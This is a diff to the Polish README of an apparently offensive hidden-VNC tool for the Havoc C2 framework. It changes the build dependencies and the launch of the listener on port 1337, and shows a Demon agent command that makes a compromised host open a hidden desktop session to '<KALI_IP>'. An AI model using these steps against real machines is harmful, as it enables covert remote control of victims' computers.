@@ -67,9 +67,10 @@ Serwer: `uhid = peer IPv4`. `input` z IP, które już ma slot → `closesocket` 
 Zobacz [README.md](README.md). Esencja:
 
 ```bash
-sudo apt install -y mingw-w64 nasm python3 wine64
+sudo apt install -y mingw-w64 nasm python3 python3-tk wine64
 make x64 && make server
-wine "bin/HVNC Server.exe"          # Kali, :1337
+python3 scripts/hd-server.py        # probes wine64 + HVNC exe, START → :1337
+# CLI: ./scripts/hd-listen.sh
 # Havoc: Load Script bin/hidden-desktop.py
 # Demon Admin (nie SYSTEM):
 HiddenDesktop <KALI_IP> 1337
